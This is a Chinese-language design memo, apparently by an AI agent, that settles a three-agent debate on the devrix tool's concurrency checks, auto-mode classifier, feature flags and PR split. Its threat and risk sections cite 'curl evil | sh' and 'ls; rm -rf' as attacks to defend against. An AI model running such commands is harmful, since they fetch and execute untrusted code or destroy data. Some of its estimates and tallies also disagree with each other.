# 博弈论辩论 Round 3 — 收敛与最终方案

**日期:** 2026-07-02
**作者:** Claude (综合者 + 评估者)
**参与方:** Claude (MiniMax-M3) + Codex (MiniMax-M2.7) + Cursor (plan mode)
**输入材料:**
- `gaming-debate-round1-claude.md` (Claude 强论证稿 + 12 Q)
- `gaming-debate-round2-codex.md` (Codex 答辩, 5552 行)
- `gaming-debate-round2-cursor.md` (Cursor 答辩, 297 行, 重试 5 次后)
- `gaming-analysis-{claude,codex,cursor}.md` (Round 0 原始分析)
- devrix 源码

---

## 0. 三方让步矩阵对比 (Round 2 末态)

| # | 议题 | Claude (R1) | Codex (R2) | Cursor (R2) | 三方收敛度 |
|---|------|------------|-----------|------------|----------|
| **D1** | per-input 实现 | 分层混合 (4 override) | 分层混合 (4 override) | **全函数化 interface** + 4 工具实现 | ✅ **实质一致** (interface 19 函数, 实现 4 override) |
| **D2** | auto-mode classifier | P2 interface | P2 interface | **P0 实施 + fail-closed** | ❌ **仍分歧** (Cursor 不让步) |
| **D3** | GrowthBook | 降 P2 | 降 P2 (从全删) | **P0 保留** (3 条具体 flag) | ❌ **仍分歧** (Cursor 不让步) |
| **D4** | PR 数量 | 5 PR | 5 PR (接受) | 5 PR | ✅ **三方一致** |

---

## 1. 让步让了什么 + 没让什么

### Cursor 的让步（关键）

| 项 | 原立场 | 让步后 | 评估 |
|----|--------|--------|------|
| D1 Q2 | 全函数化 19 工具 | 接受 4 工具 override (bash + read_file + edit_file + write_file) + 15 default | **关键让步**, 等价 Codex 折中 |
| D2 Q6 | 5s timeout 默认 allow (fail-open, 沿用 demand) | **fail-closed on timeout + ops 显式 flag 才 fail-open** | **关键让步**, 修正 demand §6 |
| D2 Q4 | (隐含: 有生产事故) | **承认 devrix 无生产安全事故** | **关键让步**, 削弱 P0 必要性论据 |
| D3 | 3 个具体 flag | 仍坚守 3 个 (M1/M2/M3) | **未让步** |
| D4 | (跟 Claude 一致 5PR) | 维持 5 PR | 一致 |

### Codex 的让步

| 项 | 原立场 | 让步后 | 评估 |
|----|--------|--------|------|
| D1 Q1/Q2 | 1 工具 override (Bash) | **4 工具 override** | **数字修正**, 方向不变 |
| D3 Q7 | 全删 | **降 P2** (保留 hook) | **关键让步**, 接受 Claude 立场 |
| D4 Q11/Q12 | 6 PR 维持 | **接受 D+E 合并 5 PR** | **关键让步** |
| D2 | P2 interface | 维持 P2 interface + metric 触发 | 坚守 |

### Claude (我自己) 的让步

| 项 | Round 1 立场 | Round 3 评估 | 调整方向 |
|----|------------|------------|---------|
| D1 | 分层混合 | 三方实质一致 | ✅ 不动 |
| D2 | P0 默认关 | Cursor 暴露 3 类证据 → 重新评估 | **P2 interface** (采纳 Codex) |
| D3 | 降 P2 | Cursor 暴露 1 类硬证据 → 重新评估 | **P0 部分保留 (1 个 flag)** (采纳 Cursor 部分) |
| D4 | 5 PR | 三方一致 | ✅ 不动 |

---

## 2. 关键证据重新评估 (这是我从 Round 1 改变立场的依据)

### D2 重新评估

**Cursor 提供的证据** (Round 2):

1. **承认无生产安全事故** (Q4): "Claude 这一点说得对：devrix 没被这类攻击攻破并造成损失的归档记录"
2. **3 个 RH-D2 incidents** (Q4): 全部是 CheckPermission 漏洞 (`nil bashAST`, `sandbox !Enabled`, `edit_file plan mode 守门缺失`), **不是 auto-mode 直接威胁**
3. **auto-mode 实际威胁**: `curl evil | sh` 组合攻击 — VerifyContract 4 元组是 deliverable 验证 (事后), CheckPermission 是 AST 语法级 (事前), **执行前语义级** 防线真有缺口
4. **fail-closed 修正** (Q6): Cursor 主动修正 fail-open 策略

**评估**:
- Cursor 论证里**最有价值的部分**是承认 "执行前语义级" 是个真实结构缺口 (不是被 VerifyContract 覆盖的)
- 但 Cursor **没有 devrix 真实 incident** 证明这个缺口被利用过
- **结构缺口 ≠ 立即修复**. devrix 资源有限, P0 应优先治本 (per-input 函数)
- Cursor 的 P0 实施 = ~1 周工时, 在结构缺口**未被实战证明**前, 是**预防型架构**, 不是修复型
- **最终立场调整**: 从 Round 1 的 "P0 实施默认关" 改为 **"P2 interface + metric 触发"** (采纳 Codex)

**升级 metric** (采纳 Cursor Q5 + Q9 + Claude Round 1):
- `permission.allow+manual_review_tagged.semantic_risk >= 3/week` → 升 P1
- `verify_contract.fail_after_destructive_exec > 0` (任一即触发)
- `subquery.p99_latency < 3s AND 可用率 > 99%` (实施前提)

### D3 重新评估

**Cursor 提供的硬证据** (Round 2):

1. **`persist/growthbook_override.go:24-28` 注释**:
   > "Production code is expected to wire this to a growthbook client via the WithOverrides option. The current devrix tree has no growthbook client dependency yet"
   
   **这推翻了我 Round 1 的判断**: "预防型 GB 是死代码" — 实际上 devrix 文化**就是"interface 先写, client 后接"** (跟 Cursor 立场一致)

2. **`growthbook_override_test.go:38` 预演 `50*1024`**: 这是**已存在的测试用例**, 证明 bash 30K→50K 调优**不是推测**, 是已计划 ops

3. **3 个具体 flag 计划** (M1/M2/M3): 每个都有数值 + 触发原因 + 时间窗口

**评估**:
- Cursor 的"devrix 已有 GB 预埋文化"论据**成立**, 我之前判断错了
- 但 "本 change 内需要 3 个 GB 文件" 跟 "M1 调优即将发生" 是**两件事**:
  - M1 bash 30K→50K 调优**已计划**, 需要 `devrix_persist_threshold_override` flag — Cursor 站得住
  - M2 bash readonly 并发 canary 需要 RC-1 治本**先验证** — 5 PR + RC-1 落地后才需要, **本 change 完成后**才接
  - M3 classifier 5% session 需要 D2 **先升 P1 实施** — 跟 D2 升 P1 联动, **本 change 完成后**才需要
- **最终立场调整**: 从 Round 1 的 "降 P2" 改为 **"P0 部分保留 (1 个 flag: bash 30K→50K), 其他 2 个 flag 推迟到 P1"** (采纳 Cursor 部分)

**这意味着 AC11 不是"全删"也不是"全留", 是"保留 1 个 flag 的接线, 其他 flag 等触发条件"**.

---

## 3. 最终方案 (4 个差异点)

### D1: per-input 函数 — **分层混合 (4 工具 override + 15 default)**

**采纳**: 三方实质一致 (Cursor 接受 4 工具表, Codex 接受 4 工具表, Claude 接受 4 工具表)

**4 工具 override 详细**:

| Tool | IsConcurrencySafe(input) 判定 | 借鉴 clawcode |
|------|------------------------------|---------------|
| **Bash** | `isReadOnly(input) → true; else false` | `BashTool.tsx:434-437` |
| **read_file** | 解析 input 找 `path` + `limit`, 大文件 (>1MB) → false | clawcode `read_file.ts` |
| **edit_file** | 解析 input 找 `file_path`, 同一 path 在同 batch → false (mutual exclusion) | clawcode `edit_file.ts` |
| **write_file** | 同 edit_file | clawcode `write_file.ts` |

**15 工具 default** (走 `s.ConcurrencySafe` 字段):
- Glob / Grep / LSP / verify / WebFetch / WebSearch / TodoRead / TodoWrite / NotebookRead / NotebookEdit / AskUserQuestion / TaskOutput / EnterPlanMode / ExitPlanMode / BackgroundTask
- default 实现: `return s.ConcurrencySafe`

**接口层面** (采纳 Cursor): 19 工具 surface 都声明 `IsConcurrencySafe(input []byte) bool` 方法 (interface 全函数), 但实现层面分层混合 (4 override + 15 default router).

### D2: auto-mode classifier — **P2 interface only + metric 触发升 P1**

**采纳**: Codex + Claude 一致 (Cursor 坚守 P0 但承认无生产事故, 论据不足以压过资源优先级)

**实施**:
- 加 `IntentClassifier.ClassifyToolUse(transcript, sideQuery) YoloResult` 方法签名
- 加 `tool_surface.go` 配套的 `ToAutoClassifierInput(input) string` 接口 (走 PR-C)
- **不**实施 SideQuery 实际调用
- **不**新建 `auto_classifier.go` 实际分类器逻辑

**升级触发** (跟 Cursor + Claude 综合):
- `permission.allow+manual_review_tagged.semantic_risk >= 3/week` (90 天窗口)
- `verify_contract.fail_after_destructive_exec > 0` (任一即触发, 即时)
- `subquery.p99_latency < 3s AND 可用率 > 99%` (实施前提)

**fail 策略修正** (采纳 Cursor Q6):
- 当 Classifier ON 状态 + SideQuery timeout → **fail-closed → deny + metric `auto_mode.classifier_timeout_deny`**
- 仅当显式 GrowthBook flag `devrix_classifier_fail_open=true` (ops 紧急开关) 才 allow

**13 T → 12 T**: 砍掉 T22-T24 (SideQuery 实施) + T07-T09 (AutoModeClassifier 集成), 保留 T16-T21 (per-input + ToAutoClassifierInput interface) + T25-T28 (Tech-Debt)

### D3: GrowthBook — **P0 部分保留 (1 个 flag)**

**采纳**: Cursor 部分 (M1 bash 30K→50K 是已计划 ops, 有测试用例证据)

**实施**:
- **保留**: `instrument/growthbook/persist_threshold_override.go` (跟 persist/T05 衔接)
- **保留 flag**: `devrix_persist_threshold_override` (bash 30K → 50K canary)
- **不**实施: `instrument/growthbook/concurrency_override.go` (等 RC-1 治本后实战触发)
- **不**实施: `instrument/growthbook/classifier_override.go` (等 D2 升 P1 后再接)

**5 PR → 5 PR 维持** (单 PR-F 范围内增减, 不影响粒度)

**升级触发**:
- `persist.truncate_rate_by_tool{bash} > 15% week` → canary 启用 5%
- 用户 ops 工单 ≥ 1 次「无重编译调 bash 阈值」 → 全量

### D4: PR 数量 — **5 PR (D+E 合并)**

**采纳**: 三方一致

**最终 5 PR**:
- **PR-A**: `ToolSurface` interface v4 (Cursor 全函数化) + 19 工具 `IsConcurrencySafe` 实现 (Codex 4 override + 15 default) — T16-T17
- **PR-B**: `ExecuteRound` partitionToolCalls 改造 + 50 文件 e2e 并发版 — T18-T19
- **PR-C**: `ToAutoClassifierInput` + 19 工具默认实现 + `ClassifyToolUse` interface (D2 降 P2) — T20-T21
- **PR-D+E (合并)**: classifier interface 测试 (D2 P2 不实施 SideQuery) + AC8 no-silent-default + 端到端 e2e — T22-T24 (P2 范围)
- **PR-F**: 1 个 GB flag (bash 30K→50K, D3 P0 部分保留) + Bash sibling abort (TD-STE-02) + Discard on fallback (TD-STE-03) + inputsEquivalent (T28 降 P3) — T25-T28

---

## 4. 最终 scope 调整 (vs 需求原状)

| AC | 原 | 调整 | 理由 |
|----|-----|------|------|
| AC1-AC3 | P0 保留 | ✅ 不动 | per-input 函数 + partitionToolCalls 治本 |
| AC4-AC7 (classifier 实施) | P0 实施 | ⚠️ **降 P2 (interface only)** | 无生产事故, 结构缺口未被实战证明 |
| AC5 (telemetry) | P0 保留 | ⚠️ **降 P2 (跟 classifier 一起)** | classifier 不实施, telemetry 无意义 |
| AC6 (fail-safe) | P0 保留 | ✅ 不动 | 治本前提 |
| AC7 (Bash isReadOnly) | P0 保留 | ✅ 不动 | 治本核心 |
| AC8 (no silent default) | P0 保留 | ✅ 不动 | 跟 per-input 配套 |
| AC9 (13 T 全实施) | P0 保留 | ⚠️ **降 12 T** | 砍 T22-T24 |
| AC10 (e2e) | P0 保留 | ✅ 不动 | 基础达标 |
| **AC11 (GrowthBook)** | P0 全留 3 flag | ⚠️ **P0 部分保留 (1 flag)** | 保留 bash 30K→50K, 其他推迟 |
| AC12 (Bash sibling abort) | P1 | ✅ 不动 | TD-STE-02 收口 |
| AC13 (Discard on fallback) | P1 | ✅ 不动 | TD-STE-03 收口 |
| **AC14 (inputsEquivalent)** | P2 | ⚠️ **降 P3** | ContentReplacementState 已覆盖, 价值低 |

**最终**: 14 AC → 12 AC, 13 T → 12 T, 6 PR → 5 PR, 估时从 1W+2D → 1W+3D (略增 1 天, 5 PR 更稳健)

---

## 5. 关键风险 (收敛后)

| 序 | 风险 | 缓解 | 来源 |
|----|------|------|------|
| 1 | `BashTool.isReadOnly` 误判 (compound `ls; rm -rf`) | parse 整个 command tree; 不可靠时保守 false; 加 `isReadOnlyPanics` metric | 治本 (per-input 函数) |
| 2 | `IsConcurrencySafe` 抛错 → turn 崩溃 | AC6 fail-safe (catch + return false), 强制 | 治本前提 |
| 3 | `partitionToolCalls` 改造破坏现有并发行为 | AC1 强制 19 工具默认保持 v2 静态行为; `surface_metadata_gate_test` AC8 回归 | 治本回归 |
| 4 | D2 (classifier) 实施推迟后, 实际 incident 发生时升级 P1 链路 | metric 触发 (Cursor + Claude 综合) 自动化; 90 天窗口 | 推迟风险 |
| 5 | D3 (bash GB) 接线过早, ops 实际需求不匹配 | 保留 1 个 flag (M1) 验证需求, 其他 2 flag 按需追加 | 推迟风险 |
| 6 | Cursor 提的 `curl evil | sh` 组合攻击真实化 | 静态规则 + VerifyContract 当前够用; P2 阶段升 P1 接 classifier | 推迟缓解 |
| 7 | 5 PR 延期风险 (跟 DM-20260702-008 9T 延期对照) | DoR 门槛 + 跨 PR 依赖合并后才开下一个; 每日 standup | 流程纪律 |

---

## 6. 借鉴关系最终评分 (博弈收敛)

| clawcode 字段 | 借鉴评分 | 实施路径 |
|--------------|---------|---------|
| `isConcurrencySafe(input)` | ★★★★★ | PR-A (per-input 函数, 分层混合) |
| `toAutoClassifierInput` | ★★★★★ | PR-C (per-tool 紧凑投影) |
| `siblingAbortController` | ★★★★★ | PR-F (T26) |
| `discard()` | ★★★★ | PR-F (T27) |
| `interruptBehavior` / `isReadOnly` / `maxResultSizeChars` / `shouldDefer` / `isDestructive` | — (devrix 已有) | 不借鉴 |
| `yoloClassifier` | ★★★ (P2) | PR-C (interface only) |
| `toCompactBlock` | ★★★ (P2) | PR-C (interface only) |
| `devrix_persist_threshold_override` flag | ★★★★ | PR-F (P0 部分, 仅 1 flag) |
| `inputsEquivalent` | ★★ (P3) | PR-F (T28, 降 P3) |
| `concurrency_override` / `classifier_override` flag | ★★ | 推迟到 RC-1 / D2 升 P1 后 |

**借鉴效率**: 需求暗示 10 项 → **实际 4 项 P0 必借鉴 + 1 项 P0 部分 + 2 项 P2 + 1 项 P3 + 2 项推迟** = 10 项分级管理, 5 PR 收口。

---

## 7. Round 2 → Round 3 三方共识度

| 决策点 | Round 0 分歧度 | Round 2 让步后分歧度 | Round 3 收敛方案 |
|--------|-------------|-------------------|-----------------|
| D1 | 高 (3 方独立立场) | **低** (Cursor 接受 4 override) | 三方一致 |
| D2 | 中 (Claude/Cursor P0, Codex P2) | **中** (Cursor 不让步) | Claude 重新评估, 采纳 Codex (P2) |
| D3 | 高 (3 方不同立场) | **中** (Cursor 3 flag 坚守) | Claude 重新评估, 采纳 Cursor 部分 (1 flag) |
| D4 | 低 (5 vs 6) | **零** (Codex 接受 5) | 三方一致 |

**总让步数**: 5 项 (Cursor 让 D1 + D2 fail 策略 + 承认无事故; Codex 让 D1 数字 + D3 降 P2 + D4 6→5; Claude 让 D2 + D3 部分)
**总坚守数**: 2 项 (Cursor 守 D2 P0 + D3 P0; Codex 守 D1 方向 + D2 P2 + fail-open; Claude 守 D1 分层 + D4 5PR)

**收敛方向**: **Claude 立场调整最多** (D1 维持 + D2 调整 + D3 调整 + D4 维持), 但**调整依据是 Cursor 提供的硬证据** (`growthbook_override_test.go:38`, `persist/growthbook_override.go:24-28`, RH-D2 incidents, 3 个具体 flag). **这是真正的博弈收敛, 不是简单平均**。

---

## 8. 推进计划 (Round 3 之后)

| 阶段 | 内容 | 估时 | 产出 |
|------|------|------|------|
| **S2 提案** | 更新 `proposal.md` (5 PR 划分 + 12 AC 调整 + 4 项 tech-debt 收口 + 借鉴评分) | 0.5 天 | 提案更新 + 4 个 OpenSpec 阶段文档 |
| **S3 设计** | 写 design.md (按 architecture-design.md 六段式, 2026-06-29 升级后) | 1 天 | 5 PR × 4-5 页设计 + 4 项 tech-debt 收口 + 借鉴对照表 |
| **S3-Gate** | 设计审查 (按 review-design.md 5 维度) | 0.5 天 | 1 个 PR (审查意见) |
| **S4 实现** | 5 PR 实施 (PR-A → B → C → D+E → F) | 1W+3D | 5 PR + 12 T + 12 AC |
| **S4-Gate** | 代码审查 (按 review-code.md) | 0.5 天 | 5 个审查 PR |
| **S5 验收** | P0 100% + 覆盖率 ≥ 80% | 0.5 天 | `verify-archive.sh` PASS |
| **S6 归档** | 移动到 `openspec/archive/2026-07-02-...` | 0.5 天 | 归档 + verify-archive 12/12 PASS |

**总估时**: 5 个工作日 (跟需求原状 1W+2D 相近, 但 scope 缩减)

---

## 9. 总结: 博弈真正收敛到了什么

**收敛的本质**:
- **D1**: 三方独立论证后**实质一致** (Cursor 接受 Codex 4 override 表, 等价)
- **D2**: 博弈**修正了我 (Claude) 的初始判断**, Cursor 暴露了 3 类证据 + 承认无事故, 让我从"P0 默认关" 改为 "P2 interface + metric 触发"
- **D3**: 博弈**修正了我 (Claude) 的"预防型=死代码"判断**, Cursor 暴露了 devrix 预埋文化 (interface 先写, client 后接) + 具体 ops 计划, 让我从"降 P2" 改为"P0 部分保留 1 flag"
- **D4**: 博弈**修正了 Codex 的"6 PR 维持"立场**, 通过 Q10/Q11/Q12 答辩让 Codex 接受"耦合性"才是 D+E 合并的真实理由

**收敛机制**:
1. 三方独立分析 (Round 0)
2. 强论证稿 + 12 反问 (Round 1)
3. 让步矩阵答辩 (Round 2)
4. 综合者重新评估 + 最终裁决 (Round 3)

**最终方案优势**:
- 治本 (per-input 函数 + partitionToolCalls) 三方一致认可
- 4 项 tech-debt 同 change 收口 (TD-STE-01/02/03/06)
- 借鉴 clawcode 4 项 (P0) + 1 项 (P0 部分) + 2 项 (P2) + 1 项 (P3) + 2 项 (推迟)
- 资源聚焦 (1W+3D, 5 PR 原子)
- 升级路径清晰 (D2 + D3 都有 metric 触发升 P1)

**应用**: 进入 S2 提案阶段, 写 `proposal.md` 更新版。
